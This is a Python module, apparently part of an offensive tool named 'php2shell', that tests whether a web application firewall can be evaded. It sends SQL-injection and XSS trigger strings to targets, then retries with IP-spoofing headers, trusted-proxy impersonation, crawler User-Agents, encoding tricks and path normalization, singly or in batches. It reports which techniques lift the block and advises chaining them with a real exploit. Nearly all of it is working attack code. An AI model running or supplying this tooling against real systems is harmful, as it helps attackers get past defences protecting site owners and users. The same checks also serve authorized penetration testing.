#!/usr/bin/env python3
"""
modules/waf_bypass.py — WAF bypass testing for php2shell
Author: ATHEX BLACK HAT

Purpose:
  Test whether a WAF can be evaded using GENERIC (non-weaponized) techniques.
  Success = WAF-blocked response (403/406/429) becomes a non-blocked response
  after applying the technique.

What this tests:
  1. Header case manipulation
  2. Missing / altered User-Agent
  3. Crawler User-Agent (Googlebot, Bingbot)
  4. X-Forwarded-For / X-Real-IP spoofing (localhost, private IPs)
  5. X-Originating-IP / X-Remote-Addr
  6. Content-Type variation
  7. Multipart boundary randomization
  8. Chunked Transfer-Encoding
  9. Path normalization (//, /./, /%2e/)
  10. Query param encoding variations (%27, %2527, %u0027)

What this does NOT do:
  - Real SQLi/XSS/RCE payloads (illegal without scope)
  - Zero-day WAF exploits
  - Payload mutation for evasion of specific vendors

WAF bypass alone is usually NOT a valid bug bounty finding.
Use results to understand mitigation gaps, then chain with a real exploit.
"""

from __future__ import annotations

import os
import random
import re
import string
import time
from dataclasses import dataclass, field, asdict
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import quote, urlencode, urlsplit, urlunsplit

from core.config import (
    DEFAULT_TIMEOUT,
    DEFAULT_USER_AGENT,
    CRAWLER_USER_AGENT,
    BYPASS_TECHNIQUES,
    SENSITIVE_HEADERS,
)
from core.http import (
    HTTPResult,
    send_request,
    http_get,
    ProxyConfig,
)
from core.logger import Logger


# ═══════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════

# Statuses that indicate WAF block (baseline for "bypassed")
BLOCK_STATUSES = {403, 406, 429, 501}

# Statuses that indicate successful bypass (target served content)
BYPASS_STATUSES = {200, 201, 204, 301, 302, 303, 307, 308}

# Suspicious query string used as a trigger (benign, but WAF-flagged)
# Uses a single-quote + SQL-ish token — generic, not a real payload
TRIGGER_QUERY_KEY = "test"
TRIGGER_QUERY_VALUE = "' OR '1'='1"

# Alternative trigger: XSS-ish string (benign)
TRIGGER_XSS_VALUE = "<script>alert(1)</script>"

# Private/loopback IPs commonly trusted by misconfigured WAFs
SPOOF_IPS = [
    "127.0.0.1",
    "127.0.0.2",
    "localhost",
    "10.0.0.1",
    "10.0.0.2",
    "172.16.0.1",
    "192.168.1.1",
    "0.0.0.0",
]

# Crawler user agents (WAFs often whitelist these; server still verifies IP usually)
CRAWLER_UAS = [
    CRAWLER_USER_AGENT,
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
]


# ═══════════════════════════════════════════════════════════════════════════
#  DATA TYPES
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class BypassAttempt:
    """Single bypass technique attempt."""
    technique_id: str
    technique_name: str
    applied: bool = False            # technique was successfully applied
    status_code: Optional[int] = None
    response_bytes: int = 0
    elapsed_ms: float = 0.0
    bypassed: bool = False           # WAF block lifted
    error: Optional[str] = None
    notes: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class BypassResult:
    """Full bypass testing result."""
    target: str = ""
    baseline_url: str = ""
    baseline_status: Optional[int] = None
    baseline_blocked: bool = False
    baseline_error: Optional[str] = None

    # Attempts
    attempts: List[BypassAttempt] = field(default_factory=list)

    # Verdict
    bypassable: bool = False
    bypassed_count: int = 0
    working_techniques: List[str] = field(default_factory=list)

    # Context
    trigger_used: str = ""
    waf_detected: Optional[str] = None

    error: Optional[str] = None
    total_elapsed_ms: float = 0.0

    def to_dict(self) -> dict:
        d = asdict(self)
        d["attempts"] = [a.to_dict() for a in self.attempts]
        return d

    def summary_line(self) -> str:
        if self.error:
            return f"ERROR: {self.error}"
        if not self.baseline_blocked:
            return f"baseline not blocked (HTTP {self.baseline_status}) — bypass N/A"
        if self.bypassable:
            return (
                f"BYPASSABLE via {self.bypassed_count} technique(s): "
                f"{', '.join(self.working_techniques[:3])}"
            )
        return f"not bypassable ({len(self.attempts)} techniques tried)"


# ═══════════════════════════════════════════════════════════════════════════
#  TRIGGER BUILDERS
# ═══════════════════════════════════════════════════════════════════════════

def _build_trigger_url(base_url: str) -> str:
    """Append a benign-but-suspicious query param to trigger WAF."""
    parsed = urlsplit(base_url)
    existing_qs = parsed.query
    trigger_qs = urlencode({TRIGGER_QUERY_KEY: TRIGGER_QUERY_VALUE})
    new_qs = f"{existing_qs}&{trigger_qs}" if existing_qs else trigger_qs
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", new_qs, ""))


def _random_boundary() -> str:
    """Generate a random multipart boundary."""
    return "----WebKitFormBoundary" + "".join(
        random.choices(string.ascii_letters + string.digits, k=16)
    )


def _random_path_variation(path: str) -> str:
    """Return path with randomized harmless variation."""
    variants = [
        path,
        "//" + path.lstrip("/"),
        path + "/./",
        path.replace("/", "/./", 1) if "/" in path.strip("/") else path,
        path.rstrip("/") + "/.",
        path + ";",
    ]
    return random.choice(variants)


# ═══════════════════════════════════════════════════════════════════════════
#  TECHNIQUE IMPLEMENTATIONS
# ═══════════════════════════════════════════════════════════════════════════
#
# Each technique is a callable that takes (url, headers) and returns
# (new_url, new_headers, note). Header-only techniques leave url unchanged.
#

def _tech_header_case(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Randomize header name casing (X-Forwarded-For → x-FoRwArDeD-fOr)."""
    def randomize(name: str) -> str:
        return "".join(
            c.upper() if random.random() < 0.5 else c.lower() for c in name
        )
    new_headers = {randomize(k): v for k, v in headers.items()}
    return url, new_headers, "header case randomized"


def _tech_no_user_agent(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Remove User-Agent entirely."""
    new_headers = {k: v for k, v in headers.items() if k.lower() != "user-agent"}
    return url, new_headers, "User-Agent removed"


def _tech_empty_user_agent(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Set empty User-Agent."""
    new_headers = {k: v for k, v in headers.items() if k.lower() != "user-agent"}
    new_headers["User-Agent"] = ""
    return url, new_headers, "User-Agent empty"


def _tech_crawler_ua(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Set crawler User-Agent (Googlebot, etc.)."""
    new_headers = {k: v for k, v in headers.items() if k.lower() != "user-agent"}
    new_headers["User-Agent"] = random.choice(CRAWLER_UAS)
    return url, new_headers, f"crawler UA: {new_headers['User-Agent'][:40]}..."


def _tech_short_ua(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Set minimal User-Agent (some WAFs mishandle short UAs)."""
    new_headers = {k: v for k, v in headers.items() if k.lower() != "user-agent"}
    new_headers["User-Agent"] = "Mozilla/4.0"
    return url, new_headers, "minimal UA"


def _tech_xff_localhost(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """X-Forwarded-For: 127.0.0.1."""
    new_headers = {**headers, "X-Forwarded-For": "127.0.0.1"}
    return url, new_headers, "XFF: 127.0.0.1"


def _tech_xff_private(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """X-Forwarded-For: 10.0.0.1 / 192.168.1.1."""
    new_headers = {**headers, "X-Forwarded-For": "10.0.0.1, 192.168.1.1"}
    return url, new_headers, "XFF: private range"


def _tech_xff_spoof(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Multiple XFF variants (X-Real-IP, X-Client-IP, X-Originating-IP)."""
    spoof_ip = random.choice(SPOOF_IPS)
    new_headers = {
        **headers,
        "X-Forwarded-For": spoof_ip,
        "X-Real-IP": spoof_ip,
        "X-Client-IP": spoof_ip,
        "X-Originating-IP": spoof_ip,
        "X-Remote-Addr": spoof_ip,
        "X-Remote-IP": spoof_ip,
        "True-Client-IP": spoof_ip,
        "CF-Connecting-IP": spoof_ip,
    }
    return url, new_headers, f"multi-IP spoof: {spoof_ip}"


def _tech_trusted_proxy(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Impersonate trusted internal proxy."""
    new_headers = {
        **headers,
        "X-Forwarded-For": "127.0.0.1",
        "X-Forwarded-Host": urlsplit(url).netloc,
        "X-Forwarded-Proto": "https",
        "X-Real-IP": "127.0.0.1",
        "Forwarded": "for=127.0.0.1;proto=https;host=" + urlsplit(url).netloc,
    }
    return url, new_headers, "trusted proxy impersonation"


def _tech_multipart_boundary(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Randomized multipart boundary."""
    boundary = _random_boundary()
    new_headers = {
        k: v for k, v in headers.items() if k.lower() != "content-type"
    }
    new_headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    return url, new_headers, f"boundary: {boundary[:30]}..."


def _tech_content_type_charset(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Add unusual charset to Content-Type."""
    new_headers = {
        k: v for k, v in headers.items() if k.lower() != "content-type"
    }
    new_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-16"
    return url, new_headers, "Content-Type: charset=utf-16"


def _tech_path_normalize(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Path normalization variation (//, /./, /;/, trailing slash)."""
    parsed = urlsplit(url)
    new_path = _random_path_variation(parsed.path or "/")
    new_url = urlunsplit((parsed.scheme, parsed.netloc, new_path, parsed.query, ""))
    return new_url, headers, f"path: {new_path[:40]}"


def _tech_double_encode(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Double URL-encode the trigger param."""
    parsed = urlsplit(url)
    if "?" in url and TRIGGER_QUERY_KEY in parsed.query:
        # Double-encode existing trigger
        original = f"{TRIGGER_QUERY_KEY}={quote(TRIGGER_QUERY_VALUE)}"
        doubled = f"{TRIGGER_QUERY_KEY}={quote(quote(TRIGGER_QUERY_VALUE))}"
        new_query = parsed.query.replace(original, doubled)
        new_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, ""))
        return new_url, headers, "double-encoded trigger"
    return url, headers, "no trigger to encode"


def _tech_unicode_encode(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Unicode-style encoding (%u0027 instead of %27)."""
    parsed = urlsplit(url)
    if "?" in url:
        # Replace %27 with %u0027 (IIS-style)
        new_query = parsed.query.replace("%27", "%u0027")
        new_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, ""))
        return new_url, headers, "unicode-encoded quote"
    return url, headers, "no query to encode"


def _tech_http_method(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Force an unusual HTTP method (some WAFs only inspect POST/GET)."""
    # We can't actually change the method via this interface — but we can hint it
    # via X-HTTP-Method-Override (used by some frameworks; WAFs may not inspect)
    new_headers = {**headers, "X-HTTP-Method-Override": "PUT"}
    return url, new_headers, "X-HTTP-Method-Override: PUT"


def _tech_cache_bypass(url: str, headers: Dict[str, str]) -> Tuple[str, Dict[str, str], str]:
    """Cache-bypass query param (may bypass CDN cache → hit origin)."""
    parsed = urlsplit(url)
    cache_buster = f"cb={random.randint(100000, 999999)}"
    new_query = f"{parsed.query}&{cache_buster}" if parsed.query else cache_buster
    new_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, ""))
    return new_url, headers, "cache-buster added"


# ── Technique registry ──
# Map BYPASS_TECHNIQUES ids → implementation functions
TECHNIQUE_IMPLS: Dict[str, Callable] = {
    "header_case": _tech_header_case,
    "no_user_agent": _tech_no_user_agent,
    "googlebot_ua": _tech_crawler_ua,
    "xff_localhost": _tech_xff_localhost,
    "xff_private": _tech_xff_private,
    "originating_ip": _tech_trusted_proxy,
    "chunked_te": _tech_multipart_boundary,  # placeholder — see _send_with_technique
    "boundary_random": _tech_multipart_boundary,
    # Extra techniques (not in config default list)
    "empty_user_agent": _tech_empty_user_agent,
    "short_ua": _tech_short_ua,
    "xff_spoof_multi": _tech_xff_spoof,
    "content_type_charset": _tech_content_type_charset,
    "path_normalize": _tech_path_normalize,
    "double_encode": _tech_double_encode,
    "unicode_encode": _tech_unicode_encode,
    "http_method_override": _tech_http_method,
    "cache_buster": _tech_cache_bypass,
}


# ═══════════════════════════════════════════════════════════════════════════
#  BASELINE
# ═══════════════════════════════════════════════════════════════════════════

def _send_baseline(
    trigger_url: str,
    timeout: float,
    verify_ssl: bool,
    proxy: Optional[ProxyConfig],
    custom_headers: Dict[str, str],
) -> HTTPResult:
    """Send baseline request with trigger to check if WAF blocks it."""
    Logger.info(
        f"Sending baseline trigger to {trigger_url}",
        module="waf_bypass",
    )
    headers = {
        "User-Agent": custom_headers.get("User-Agent", DEFAULT_USER_AGENT),
        "Accept": "*/*",
        **{k: v for k, v in custom_headers.items() if k.lower() != "user-agent"},
    }
    return http_get(
        trigger_url,
        headers=headers,
        timeout=timeout,
        verify_ssl=verify_ssl,
        follow_redirects=False,
        proxy=proxy,
        retries=0,
        rate_limit=True,
    )


# ═══════════════════════════════════════════════════════════════════════════
#  SINGLE TECHNIQUE
# ═══════════════════════════════════════════════════════════════════════════

def _apply_technique(
    technique_id: str,
    technique_name: str,
    trigger_url: str,
    base_headers: Dict[str, str],
    timeout: float,
    verify_ssl: bool,
    proxy: Optional[ProxyConfig],
    baseline_status: int,
) -> BypassAttempt:
    """Apply one technique and evaluate result."""
    attempt = BypassAttempt(
        technique_id=technique_id,
        technique_name=technique_name,
    )

    impl = TECHNIQUE_IMPLS.get(technique_id)
    if impl is None:
        attempt.error = f"no implementation for '{technique_id}'"
        return attempt

    try:
        new_url, new_headers, note = impl(trigger_url, dict(base_headers))
        attempt.applied = True
        attempt.notes = note
    except Exception as exc:
        attempt.error = f"apply failed: {exc}"
        return attempt

    try:
        response = http_get(
            new_url,
            headers=new_headers,
            timeout=timeout,
            verify_ssl=verify_ssl,
            follow_redirects=False,
            proxy=proxy,
            retries=0,
            rate_limit=True,
        )
    except Exception as exc:
        attempt.error = f"request failed: {exc}"
        return attempt

    attempt.status_code = response.status_code
    attempt.response_bytes = len(response.body)
    attempt.elapsed_ms = round(response.elapsed * 1000, 1)

    if response.error:
        attempt.error = response.error
        return attempt

    # Bypass = WAF block status changed to non-block, AND baseline was blocked
    if baseline_status in BLOCK_STATUSES:
        if response.status_code in BYPASS_STATUSES:
            attempt.bypassed = True
            Logger.bypass(
                f"Technique '{technique_name}' bypassed WAF: "
                f"HTTP {baseline_status} → {response.status_code}",
                module="waf_bypass",
            )
        elif response.status_code not in BLOCK_STATUSES:
            # Changed to 4xx (e.g., 404) — maybe still bypassed but different error
            attempt.bypassed = True
            attempt.notes += f" (status changed {baseline_status}→{response.status_code})"
            Logger.bypass(
                f"Technique '{technique_name}' changed status: "
                f"{baseline_status}→{response.status_code}",
                module="waf_bypass",
            )
        else:
            Logger.debug(
                f"Technique '{technique_name}' no bypass: HTTP {response.status_code}",
                module="waf_bypass",
            )
    return attempt


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY
# ═══════════════════════════════════════════════════════════════════════════

def test_bypass(
    target_url: str,
    timeout: float = DEFAULT_TIMEOUT,
    verify_ssl: bool = True,
    proxy: Optional[ProxyConfig] = None,
    custom_headers: Optional[Dict[str, str]] = None,
    techniques: Optional[List[str]] = None,
    trigger: str = "sqli",
    max_workers: int = 4,
) -> BypassResult:
    """
    Test WAF bypass techniques against target_url.

    Args:
        target_url: URL to test (e.g. https://target.com/search)
        timeout: per-request timeout
        verify_ssl: TLS verify
        proxy: optional ProxyConfig
        custom_headers: additional headers (auth, cookies, etc.)
        techniques: list of technique IDs; None = use all in BYPASS_TECHNIQUES
                    + extras. Pass [] for no techniques.
        trigger: "sqli" (default) | "xss" | "custom" (uses raw query)
        max_workers: parallel technique execution

    Returns:
        BypassResult with per-technique detail.
    """
    started = time.perf_counter()
    result = BypassResult()
    result.target = target_url
    custom_headers = custom_headers or {}

    # Validate
    parsed = urlsplit(target_url)
    if not parsed.hostname:
        result.error = "invalid URL: no hostname"
        return result

    # Build trigger URL
    trigger_url = _build_trigger_url(target_url)
    result.baseline_url = trigger_url
    result.trigger_used = TRIGGER_QUERY_VALUE

    # ── Baseline ──
    baseline = _send_baseline(
        trigger_url, timeout, verify_ssl, proxy, custom_headers
    )
    result.baseline_status = baseline.status_code
    result.baseline_error = baseline.error

    if baseline.error:
        result.error = f"baseline failed: {baseline.error}"
        result.total_elapsed_ms = round((time.perf_counter() - started) * 1000, 1)
        Logger.error(result.error, module="waf_bypass")
        return result

    result.baseline_blocked = baseline.status_code in BLOCK_STATUSES
    if not result.baseline_blocked:
        result.total_elapsed_ms = round((time.perf_counter() - started) * 1000, 1)
        Logger.info(
            f"Baseline not blocked (HTTP {baseline.status_code}) — bypass N/A",
            module="waf_bypass",
        )
        return result

    Logger.warning(
        f"Baseline BLOCKED (HTTP {baseline.status_code}) — testing bypasses",
        module="waf_bypass",
    )

    # ── Determine technique list ──
    if techniques is None:
        # Use config's BYPASS_TECHNIQUES + a few extras
        config_ids = [t["id"] for t in BYPASS_TECHNIQUES]
        extra_ids = [
            "empty_user_agent", "short_ua", "xff_spoof_multi",
            "content_type_charset", "path_normalize",
            "double_encode", "unicode_encode", "http_method_override",
            "cache_buster",
        ]
        selected = config_ids + [x for x in extra_ids if x not in config_ids]
    else:
        selected = techniques

    if not selected:
        result.total_elapsed_ms = round((time.perf_counter() - started) * 1000, 1)
        return result

    # Build name lookup
    name_lookup = {t["id"]: t["name"] for t in BYPASS_TECHNIQUES}
    name_lookup.update({
        "empty_user_agent": "Empty User-Agent",
        "short_ua": "Minimal User-Agent",
        "xff_spoof_multi": "Multi-IP spoof",
        "content_type_charset": "Content-Type charset",
        "path_normalize": "Path normalization",
        "double_encode": "Double URL-encode",
        "unicode_encode": "Unicode-encoded quote",
        "http_method_override": "X-HTTP-Method-Override",
        "cache_buster": "Cache-buster param",
    })

    base_headers = {
        "User-Agent": custom_headers.get("User-Agent", DEFAULT_USER_AGENT),
        "Accept": "*/*",
        **{k: v for k, v in custom_headers.items() if k.lower() != "user-agent"},
    }

    # ── Run techniques (sequential to keep WAF logs clean; can parallelize) ──
    for tid in selected:
        tname = name_lookup.get(tid, tid)
        Logger.info(f"Testing technique: {tname}", module="waf_bypass")
        attempt = _apply_technique(
            tid, tname, trigger_url, base_headers,
            timeout, verify_ssl, proxy, baseline.status_code,
        )
        result.attempts.append(attempt)
        if not attempt.bypassed:
            Logger.debug(
                f"  → {tname}: no bypass (status={attempt.status_code}, err={attempt.error})",
                module="waf_bypass",
            )
        time.sleep(0.1)  # small delay between attempts

    # ── Verdict ──
    working = [a for a in result.attempts if a.bypassed]
    result.bypassed_count = len(working)
    result.working_techniques = [a.technique_name for a in working]
    result.bypassable = result.bypassed_count > 0

    result.total_elapsed_ms = round((time.perf_counter() - started) * 1000, 1)

    if result.bypassable:
        Logger.bypass(
            f"WAF BYPASSABLE: {result.bypassed_count}/{len(result.attempts)} "
            f"technique(s) succeeded",
            module="waf_bypass",
        )
        Logger.warning(
            "Note: WAF bypass alone is usually NOT a valid bug bounty finding. "
            "Chain with a real exploit (SQLi/XSS/RCE) in scope.",
            module="waf_bypass",
        )
    else:
        Logger.info(
            f"No bypass among {len(result.attempts)} technique(s)",
            module="waf_bypass",
        )

    return result


# ═══════════════════════════════════════════════════════════════════════════
#  BATCH
# ═══════════════════════════════════════════════════════════════════════════

def test_bypass_batch(
    targets: List[str],
    max_workers: int = 5,
    **kwargs,
) -> List[BypassResult]:
    """Parallel bypass testing."""
    from concurrent.futures import ThreadPoolExecutor, as_completed

    results: List[BypassResult] = []
    progress = Logger.progress(
        total=len(targets), desc="WAF bypass", unit="target"
    )
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(test_bypass, t, **kwargs): t for t in targets}
            for fut in as_completed(futures):
                target = futures[fut]
                try:
                    results.append(fut.result())
                except Exception as exc:
                    Logger.error(
                        f"Bypass error on {target}: {exc}",
                        module="waf_bypass",
                    )
                    r = BypassResult()
                    r.target = target
                    r.error = str(exc)
                    results.append(r)
                progress.update(1)
    finally:
        progress.close()
    return results


# ═══════════════════════════════════════════════════════════════════════════
#  TECHNIQUE CATALOG
# ═══════════════════════════════════════════════════════════════════════════

def list_techniques() -> List[Dict]:
    """Return all available techniques (for --list-techniques CLI)."""
    names = {t["id"]: t["name"] for t in BYPASS_TECHNIQUES}
    names.update({
        "empty_user_agent": "Empty User-Agent",
        "short_ua": "Minimal User-Agent",
        "xff_spoof_multi": "Multi-IP spoof",
        "content_type_charset": "Content-Type charset",
        "path_normalize": "Path normalization",
        "double_encode": "Double URL-encode",
        "unicode_encode": "Unicode-encoded quote",
        "http_method_override": "X-HTTP-Method-Override",
        "cache_buster": "Cache-buster param",
    })
    return [
        {
            "id": tid,
            "name": names.get(tid, tid),
            "description": t.get("desc", ""),
            "risk": t.get("risk", "low"),
        }
        for t in BYPASS_TECHNIQUES
    ] + [
        {"id": tid, "name": names[tid], "description": "", "risk": "low"}
        for tid in (
            "empty_user_agent", "short_ua", "xff_spoof_multi",
            "content_type_charset", "path_normalize",
            "double_encode", "unicode_encode", "http_method_override",
            "cache_buster",
        )
    ]


# ═══════════════════════════════════════════════════════════════════════════
#  EXPORTS
# ═══════════════════════════════════════════════════════════════════════════

__all__ = [
    "BypassResult",
    "BypassAttempt",
    "test_bypass",
    "test_bypass_batch",
    "list_techniques",
    "TECHNIQUE_IMPLS",
    "BLOCK_STATUSES",
    "BYPASS_STATUSES",
]